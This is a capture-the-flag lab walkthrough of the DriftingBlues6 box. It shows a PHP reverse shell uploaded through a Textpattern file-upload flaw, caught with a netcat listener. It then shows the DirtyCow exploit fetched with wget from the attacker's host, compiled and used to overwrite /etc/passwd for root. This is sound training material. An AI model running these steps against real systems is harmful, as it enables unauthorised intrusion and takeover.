# PG Play - DriftingBlues6

#### Ip: 192.168.156.219
#### Name: DriftingBlues6
#### Difficulty: Easy
#### Community Rating: Intermediate

----------------------------------------------------------------------

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. Here I'll also use the `sC` and `-sV` flags to use basic scripts and to enumerate versions.

```text
┌──(ryan㉿kali)-[~/PG/DriftingBlues6]
└─$ sudo nmap -p-  --min-rate 10000 192.168.156.219 -sC -sV
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-01 14:49 CDT
Nmap scan report for 192.168.156.219
Host is up (0.072s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/textpattern/textpattern
|_http-title: driftingblues
|_http-server-header: Apache/2.2.22 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.87 seconds
```

Heading to the site we find a simple page:

![site.png](../assets/driftingblues6_assets/site.png)

And navigating to the `/textpattern/textpattern` found in robots.txt in the Nmap results, we find a login page:

text.png

Lets kick off some directory fuxxing against the site ( note: I'm using the `--filter-status 404` flag because I was getting a ton of 404s returning:

ferox.png

Spammer seems interesting. Navigating to 192.168.156.219/spammer I'm prompted to dowload a file called spammer.zip. 

```text
┌──(ryan㉿kali)-[~/PG/DriftingBlues6]
└─$ file spammer.zip 
spammer.zip: Zip archive data, at least v2.0 to extract, compression method=store
                                                                                                                             
┌──(ryan㉿kali)-[~/PG/DriftingBlues6]
└─$ unzip spammer.zip                            
Archive:  spammer.zip
[spammer.zip] creds.txt password: 
```

Looks like it is indeed a zip file, and it looks like it may hold credentials. Unfortunately it's password protected. 

Lets crack the password using fcrackzip:

fcrack.png

Cool, we now have the password, lets unzip it:

```text
┌──(ryan㉿kali)-[~/PG/DriftingBlues6]
└─$ unzip spammer.zip                                              
Archive:  spammer.zip
[spammer.zip] creds.txt password: 
 extracting: creds.txt               
                                                                                                                             
┌──(ryan㉿kali)-[~/PG/DriftingBlues6]
└─$ cat creds.txt   
mayer:lionheart
```

Nice, we were able to use these credentials to login:

login.png

### Exploitation

Looking at possible vulnerabilities here, I find the following: https://www.exploit-db.com/exploits/50415

This is interesting because it tells us we can upload malicious files to the server, and just as importantly where those files are saved.

Lets try and use PentestMonkey's php-reverse-shell.php here rather than just a webshell.

First we'll need to update the IP and port we'll be listening on in the script:

php.png

Then we can upload it to the files section of the page:

upload.png

Next, after setting up a NetCat listener, we can trigger the exploit by navigating to http://192.168.156.219/textpattern/files/php-reverse-shell.php

The page should just hang, and if we check ur listener, we can confirm we've caught the shell back:

```text
┌──(ryan㉿kali)-[~/PG/DriftingBlues6]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.45.177] from (UNKNOWN) [192.168.156.219] 50231
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
 15:14:32 up  2:03,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ hostname
driftingblues
```

Interesting, it appears there are no low-level users in the `/home` directory. Lets just straight for root here.

### Privilege Escalation

Lets go ahead and transfer over LinPEAS to help with enumerating a privilege escalation vector:

transfer.png

Linpeas finds the box is likely vulnerable to DirtyCow.

dc.png

Lets give it a shot:

```text
www-data@driftingblues:/tmp$ wget http://192.168.45.177/dirtycow.c
--2023-09-01 15:24:57--  http://192.168.45.177/dirtycow.c
Connecting to 192.168.45.177:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4814 (4.7K) [text/x-csrc]
Saving to: `dirtycow.c'

100%[======================================>] 4,814       --.-K/s   in 0.007s  

2023-09-01 15:24:57 (715 KB/s) - `dirtycow.c' saved [4814/4814]

www-data@driftingblues:/tmp$ gcc -pthread dirtycow.c -o dirty -lcrypt
www-data@driftingblues:/tmp$ chmod +x dirty
www-data@driftingblues:/tmp$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fijI1lDcvwk7k:0:0:pwned:/root:/bin/bash

mmap: 7f3648232000
^C
www-data@driftingblues:/tmp$ su firefart
Password: 
firefart@driftingblues:/tmp# whoami
firefart
firefart@driftingblues:/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@driftingblues:/tmp# cd /root
firefart@driftingblues:~# pwd
/root
```

Nice that worked! Lets grab the final flag:

root_flag.png

Thanks for following along!

-Ryan

---------------------------------------------------------------------
